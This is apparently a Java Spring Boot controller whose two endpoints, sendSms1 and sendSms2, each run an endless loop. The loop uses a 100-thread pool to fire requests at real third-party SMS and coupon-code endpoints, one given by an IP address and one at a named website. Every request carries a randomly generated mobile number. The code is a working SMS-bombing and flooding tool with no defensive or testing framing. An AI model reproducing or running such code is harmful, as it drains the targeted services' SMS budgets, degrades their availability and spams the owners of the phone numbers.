package com.ibkr.web;

import com.alibaba.fastjson.JSONObject;
import io.netty.util.concurrent.DefaultThreadFactory;
import org.apache.commons.lang3.RandomStringUtils;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.http.HttpEntity;
import org.springframework.http.HttpHeaders;
import org.springframework.http.MediaType;
import org.springframework.http.ResponseEntity;
import org.springframework.util.LinkedMultiValueMap;
import org.springframework.util.MultiValueMap;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.client.RestTemplate;

import java.util.concurrent.LinkedBlockingQueue;
import java.util.concurrent.ThreadPoolExecutor;
import java.util.concurrent.TimeUnit;

/**
 * Created by caoliang on 2020/9/24
 */
@RestController
@RequestMapping("index")
public class IndexController {
    private Logger logger = LoggerFactory.getLogger(IndexController.class);


    private ThreadPoolExecutor executor = new ThreadPoolExecutor(100, 100, 0L, TimeUnit.MILLISECONDS, new LinkedBlockingQueue<Runnable>(), new DefaultThreadFactory("http-executor-pool"));


    @Autowired
    private RestTemplate restTemplate;

    @GetMapping("sendSms1")
    public String sendSms1() {
        String url = "http://114.55.18.152/wechat/share/getCodeShareCoupon?mobile=185";
        while (true) {
            executor.submit(() -> {
                try {
                    for (int i = 0; i < 100; i++) {
                        ResponseEntity<String> responseBody = restTemplate.getForEntity(url + RandomStringUtils.randomNumeric(8), String.class);
                        logger.info("{}", responseBody.getBody());
                    }
                } catch (Exception e) {
                    logger.error(e.getMessage(), e);
                }
            });
            try {
                TimeUnit.MICROSECONDS.sleep(50);
            } catch (InterruptedException e) {
                logger.error(e.getMessage(), e);
            }
        }
    }


    @GetMapping("sendSms2")
    public void sendSms2() {
        String url = "https://www.42how.com/wx_mini/wx-site/send_sms";

        while (true) {
            HttpHeaders headers = new HttpHeaders();
            headers.setContentType(MediaType.APPLICATION_FORM_URLENCODED);
            executor.submit(() -> {
                for (int i = 0; i < 100; i++) {
                    MultiValueMap params = new LinkedMultiValueMap();
                    HttpEntity<MultiValueMap<String, String>> requestEntity = new HttpEntity<>(params, headers);

                    params.add("phone", 186 + RandomStringUtils.randomNumeric(8));
                    ResponseEntity<String> responseBody = restTemplate.postForEntity(url, requestEntity, String.class);
                    logger.info("{}", responseBody.getBody());
                }

            });
            try {
                TimeUnit.MICROSECONDS.sleep(50);
            } catch (InterruptedException e) {
                logger.error(e.getMessage(), e);
            }
        }
    }
}
